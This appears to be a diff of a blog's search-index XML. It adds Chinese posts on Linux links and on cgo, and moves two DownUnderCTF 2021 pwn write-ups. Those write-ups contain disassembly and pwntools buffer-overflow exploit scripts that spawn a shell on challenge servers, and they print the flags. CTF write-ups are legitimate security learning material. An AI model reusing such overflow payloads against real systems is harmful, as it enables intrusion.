@@ -1191,6 +1191,18 @@ tag = urllib.parse.unquote(url)
       </tags>
   </entry>
   <entry>
+    <title>New Best Toefl Score 2019 Aug</title>
+    <url>/2019/09/04/blogarchive/2019-09-04-08-30-23/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2019/09/05/MZ9cxheQ3jJ5PEG.png" alt="4087FDA874E59871EAACAEC74B194535.png"></p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>toefl</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>How to change ssh port or add ssh port</title>
     <url>/2019/09/04/blogarchive/2019-09-04-14-19-40/</url>
     <content><![CDATA[<h3 id="Adding-ports"><a href="#Adding-ports" class="headerlink" title="Adding ports"></a>Adding ports</h3><ol>
@@ -1220,18 +1232,6 @@ tag = urllib.parse.unquote(url)
         <tag>aliyun</tag>
         <tag>ssh</tag>
         <tag>server</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>New Best Toefl Score 2019 Aug</title>
-    <url>/2019/09/04/blogarchive/2019-09-04-08-30-23/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2019/09/05/MZ9cxheQ3jJ5PEG.png" alt="4087FDA874E59871EAACAEC74B194535.png"></p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>toefl</tag>
       </tags>
   </entry>
   <entry>
@@ -1963,6 +1963,89 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>Linux中软链接(soft link)和硬链接(hard link)的区别</title>
+    <url>/2022/06/26/coding/linux-hard-link-vs-soft-link/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>linux中, 有一个和windows快捷方式相似的功能，叫做链接 (<strong>Links</strong>). 在linux中, 创建链接可以使用命令<code>ln</code>. </p>
+<p>但是ln可以创建两张链接, 一种是软链接 (<strong>soft link</strong>), 一种是硬链接(<strong>hard link</strong>)</p>
+<p>软链接可以用 <code>ln -s src dest</code> 来创建</p>
+<p>硬链接可以用 <code>ln src dest</code> 来创建</p>
+<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>区别是啥呐? </p>
+<p>首先linux中每个文件都有一个指定的Inode。 这个Inode就像是数据库中的一条数据。每个Inode都有一个自己指定的编号。</p>
+<p>比如我们有一个文件 A(Inode # 1)。</p>
+<h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>假如我们使用软链接创建一个文件B，那么这个文件B会有自己的一个Inode -&gt; B (Inode #2) 。 在这种情况下，文件B相当于一个快捷方式，指向了文件A的地址。</p>
+<p>这种情况下，假如我们删除了文件A，那么文件B就指向一个不存在的地址，就相当于失效了。</p>
+<h2 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h2><p>如果用硬链接，就不一样了。硬链接不是指向文件的地址，而是直接指向了文件的Inode。</p>
+<p>比如用硬链接创建文件A的链接C，那么文件C会有和A一样的Inode ID -&gt; C (Inode #1)。</p>
+<p>这种情况下，假如我们删除了文件A，文件C依然指向文件本身，所以链接C依旧可用。</p>
+<p><em>可以把C看作是A的拷贝，但是他们指向的文件内容其实是一样的</em></p>
+]]></content>
+      <categories>
+        <category>Coding</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在golang里调用c</title>
+    <url>/2022/05/09/coding/zai-golang-li-diao-yong-c/</url>
+    <content><![CDATA[<h1 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h1><ul>
+<li><a href="#Intro">Intro</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li>
+<li><a href="#%E8%B8%A9%E5%9D%91">坑</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a></li>
+</ul>
+<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>golang有一个贼牛的东西叫做cgo，这个可以让你在golang里运行c, 当然也可以调用c的library，总之就是很牛皮</p>
+<p>cgo 官方文档: <a href="https://pkg.go.dev/cmd/cgo">https://pkg.go.dev/cmd/cgo</a></p>
+<span id="more"></span>
+
+<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>这边简单说一下golang里调用c的基本方法</p>
+<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><p>我们首先来看一下最简单的hello world. </p>
+<ul>
+<li>如果要使用c, 首先需要<code>import &quot;C&quot;</code>, 并且在这行代码的上面要加上对应的c code, 比如引入头文件, 定义一些函数之类的</li>
+<li>调用C的函数的话就用<code>C.&lt;function name&gt;</code>, 但是要注意的是，返回的值都是C的类型。 如果要把他变成golang的类型，需要进行转换</li>
+<li>调用C的函数的话，传入的参数同样必须为C的类型</li>
+</ul>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void println(char * s) &#123;</span></span><br><span class="line"><span class="comment">	printf(&quot;%s\n&quot;,s);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.<span class="built_in">println</span>(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="如何引入外部的C文件"><a href="#如何引入外部的C文件" class="headerlink" title="如何引入外部的C文件"></a>如何引入外部的C文件</h2><p>比如,我有一个c文件</p>
+<p>a.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">println</span><span class="params">(<span class="keyword">char</span> * s)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>a.h</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">println</span><span class="params">(<span class="keyword">char</span> * s)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>那么要在golang里调用的话就是</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;a.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.<span class="built_in">println</span>(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="调用第三方库"><a href="#调用第三方库" class="headerlink" title="调用第三方库"></a>调用第三方库</h2><p>这里以调用<code>libmpv</code>为例子.</p>
+<p>注意<code>mpv/client.h</code>以及对应的库文件(<code>mpv-2.dll</code>或者<code>libmpv.so</code>）必须在PATH环境变量中。</p>
+<p>如果不在的话，需要修改LDFLAGS <code>#cgo LDFLAGS: -L./lib -lmpv</code></p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;mpv/client.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#cgo LDFLAGS: -lmpv</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ClientApiVersion</span><span class="params">()</span> <span class="title">uint32</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">uint32</span>(C.mpv_client_api_version())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p><strong>不同的系统有不同的Primitive data</strong></p>
+<p>比如</p>
+<p>在windows上，<code>uint64</code> 或者说 <code>long</code> 他的大小是 4 byte.<br>但是在unix/linux上, <code>uint64</code> 的大小是 8 byte.</p>
+<p>这就导致了一些问题，比如我有一个项目需要同时支持两个系统，那么当我想传入<code>uint64</code>的时候，在windows上得用<code>ulong</code>,在linux上就得用 <code>ulonglong</code>.</p>
+<p>解决方式就是使用引入<code>stdint.h</code> 然后使用 <code>uint64_t</code>.</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    C.some_function(C.uint64_t(<span class="number">1000</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><p><strong>Q: 遇到<code>unexpected type: ...</code>是怎么回事呢</strong></p>
+<p><code>...</code> 在c里面代表可变的函数参数，但是cgo无法识别他，所以会报错。解决方法就是写一个函数，在c里面调用这个函数，给golang的函数里就不要出现可变的部分了</p>
+<p>举个例子, 比如以下情况就会出现这个报错，因为printf 里有个可变部分。<code>int printf(const char *format, ...)</code></p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.printf(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Coding</category>
+      </categories>
+      <tags>
+        <tag>golang</tag>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>first glance of alloca in ctf</title>
     <url>/2022/03/28/ctf/first-glance-of-alloca-in-ctf/</url>
     <content><![CDATA[<h1 id="0x1-background"><a href="#0x1-background" class="headerlink" title="0x1 background"></a>0x1 background</h1><p>when I was doing zeropts CTF 2022, I found a pwn question called accountant.</p>
@@ -2331,8 +2414,8 @@ https://www.bsfdvbsbilibili.com
         <category>Life</category>
       </categories>
       <tags>
-        <tag>碎碎念</tag>
         <tag>golang</tag>
+        <tag>碎碎念</tag>
       </tags>
   </entry>
   <entry>
@@ -2551,36 +2634,6 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
-    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
-    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
-    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
-<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
-<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
-<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x20-0x8)+(0xdeadc0de).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>writeup</tag>
-        <tag>ductf</tag>
-        <tag>buffer overflow</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[writeup][DownUnderCTF 2021] pwn-outbackdoor</title>
     <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-outbackdoor/</url>
     <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
@@ -2603,6 +2656,36 @@ https://www.bsfdvbsbilibili.com
 <h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31921&#x27; outBackdoor</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;outBackdoor&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31921)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line"># GDB will be launched if the exploit is run via e.g.</span><br><span class="line"># ./exploit.py GDB</span><br><span class="line">gdbscript = &#x27;&#x27;&#x27;</span><br><span class="line">tbreak main</span><br><span class="line">continue</span><br><span class="line">&#x27;&#x27;&#x27;.format(**locals())</span><br><span class="line"></span><br><span class="line">#===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line">#===========================================================</span><br><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"># shellcode = asm(shellcraft.sh())</span><br><span class="line"># payload = fit(&#123;</span><br><span class="line">#     32: 0xdeadbeef,</span><br><span class="line">#     &#x27;iaaa&#x27;: [1, 2, &#x27;Hello&#x27;, 3]</span><br><span class="line"># &#125;, length=128)</span><br><span class="line"># io.send(payload)</span><br><span class="line"># flag = io.recv(...)</span><br><span class="line"># log.success(flag)</span><br><span class="line">import os</span><br><span class="line">print(io.recv(1024))</span><br><span class="line">io.send(os.urandom(0x10+0x8)+(0x401016).to_bytes(0x8,&quot;little&quot;)+(0x004011d7).to_bytes(0x8,&quot;little&quot;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>DUCTF{<a href="https://www.youtube.com/watch?v=XfR9iY5y94s%7D">https://www.youtube.com/watch?v=XfR9iY5y94s}</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>ductf</tag>
+        <tag>buffer overflow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
+    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
+    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
+<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
+<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
+<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span 